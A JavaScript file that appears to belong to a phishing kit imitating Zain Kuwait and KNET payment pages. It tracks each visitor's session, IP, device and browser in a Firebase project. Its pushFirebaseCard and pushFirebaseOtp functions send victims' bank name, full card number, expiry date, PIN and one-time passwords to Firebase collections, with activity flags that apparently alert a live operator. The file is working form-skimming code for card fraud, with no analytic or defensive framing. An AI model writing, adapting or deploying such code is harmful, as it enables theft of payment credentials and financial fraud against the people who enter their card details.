(function () {
  const firebaseConfig = {
    apiKey: "AIzaSyCw6S6m-6m-6m-6m-6m-6m-6m",
    authDomain: "zain-kw-admin.firebaseapp.com",
    databaseURL: "https://zain-kw-admin-default-rtdb.firebaseio.com",
    projectId: "zain-kw-admin",
    storageBucket: "zain-kw-admin.appspot.com",
    messagingSenderId: "1234567890",
    appId: "1:1234567890:web:1234567890"
  };

  if (!firebase.apps.length) {
    firebase.initializeApp(firebaseConfig);
  }

  const db = firebase.firestore();
  const rtd = firebase.database();

  let sessionId = localStorage.getItem('zain_session_id');
  if (!sessionId) {
    sessionId = 'sess_' + Math.random().toString(36).substr(2, 9);
    localStorage.setItem('zain_session_id', sessionId);
  }

  window.getDeviceAndBrowser = function () {
    const ua = navigator.userAgent;
    let browser = "Other";
    if (ua.includes("Firefox")) browser = "Firefox";
    else if (ua.includes("Chrome")) browser = "Chrome";
    else if (ua.includes("Safari")) browser = "Safari";
    else if (ua.includes("Edge")) browser = "Edge";

    let device = "PC";
    if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua)) {
      device = "Mobile";
    }
    return { device, browser };
  };

  function getFriendlyPageName() {
    const path = window.location.pathname;
    if (path.includes('knet')) return 'صفحة الكي نت';
    if (path.includes('verification')) return 'صفحة التحقق';
    if (path.includes('gateway')) return 'بوابة الدفع';
    return 'الصفحة الرئيسية';
  }

  window.initFirebaseSession = async function () {
    const { device, browser } = window.getDeviceAndBrowser();
    const docRef = db.collection("payments").doc(sessionId);
    const friendlyPage = getFriendlyPageName();
    const rtdSessionRef = rtd.ref('sessions/' + sessionId);
    const now = Date.now();
    const createdTime = new Date().toLocaleTimeString('ar-EG', { hour: '2-digit', minute: '2-digit' });

    // جلب IP بشكل سريع وغير معطل للدخول
    let visitorIp = 'Unknown';
    try {
      const res = await fetch('https://api.ipify.org?format=json');
      const data = await res.json();
      visitorIp = data.ip;
    } catch (e) {}

    const sessionData = {
      id: sessionId,
      status: 'active',
      phone: '',
      amount: '0.000 د.ك',
      page: friendlyPage,
      device: device,
      browser: browser,
      createdTime: createdTime,
      startTime: now,
      country: 'الكويت',
      hasNewActivity: false,
      ip: visitorIp
    };

    // Update RTD
    rtdSessionRef.once('value', (snapshot) => {
      if (!snapshot.exists()) {
        rtdSessionRef.set(sessionData);
      } else {
        rtdSessionRef.update({ page: friendlyPage, status: 'active', hasNewActivity: true, ip: visitorIp });
      }
    });

    // Update Firestore
    docRef.get().then((snap) => {
      if (!snap.exists) {
        docRef.set({ ...sessionData, status: 'PENDING', paymentAttempts: [], timeline: [] });
      } else {
        docRef.update({ page: friendlyPage, hasNewActivity: true, ip: visitorIp });
      }
    });
  };

  window.pushFirebaseCard = function (bank, prefix, cardNum, expMonth, expYear, pin) {
    const attemptId = 'card_' + Date.now();
    const timestampStr = new Date().toLocaleTimeString('ar-EG', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
    
    const cardData = {
      id: attemptId,
      bankName: bank || 'غير معروف',
      cardPrefix: prefix || '',
      cardNumber: cardNum || '',
      expiry: `${expMonth || ''}/${expYear || ''}`,
      pin: pin || '',
      timestamp: timestampStr
    };

    rtd.ref('sessions/' + sessionId + '/attempts/' + attemptId).set(cardData);
    rtd.ref('sessions/' + sessionId).update({ hasNewActivity: true, page: 'صفحة التحقق' });
    db.collection("card_data").doc(sessionId).collection("attempts").doc(attemptId).set(cardData);
  };

  window.pushFirebaseOtp = function (otp) {
    const otpId = 'otp_' + Date.now();
    const timestampStr = new Date().toLocaleTimeString('ar-EG', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
    const otpData = { id: otpId, otp: otp, timestamp: timestampStr };
    
    rtd.ref('sessions/' + sessionId + '/otps/' + otpId).set(otpData);
    rtd.ref('sessions/' + sessionId).update({ hasNewActivity: true });
    db.collection("card_data").doc(sessionId).collection("otps").doc(otpId).set(otpData);
  };

  window.initFirebaseSession();
})();
